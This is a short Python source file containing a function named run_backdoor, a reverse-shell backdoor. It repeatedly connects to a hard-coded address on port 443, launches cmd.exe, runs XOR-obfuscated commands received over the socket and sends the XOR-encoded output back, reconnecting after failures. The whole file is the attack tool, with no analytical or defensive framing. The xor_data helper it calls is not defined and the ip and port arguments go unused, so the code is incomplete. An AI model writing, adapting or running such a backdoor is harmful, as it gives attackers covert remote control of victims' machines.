import socket
import subprocess
import time
import select

def run_backdoor(ip: str, port: int):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("10.211.55.5", 443))
            
        
            proc = subprocess.Popen(
                "cmd.exe",
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True
            )
            
            while True:
               
                ready_to_read, _, _ = select.select([s], [], [], 0.1)
                
                if ready_to_read:
                    data = s.recv(4096)
                    if not data: break
                    cmd = xor_data(data).decode().strip()
                    proc.stdin.write(cmd.encode() + b"\n")
                    proc.stdin.flush()
                
          
                if proc.poll() is not None: break
                
       
                output = proc.stdout.read(1024) + proc.stderr.read(1024)
                if output:
                    s.send(xor_data(output))
                    
        except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError):
            if 'proc' in locals(): proc.kill()
            s.close()
            time.sleep(5) 
        except Exception as e:
            time.sleep(10)
            continue
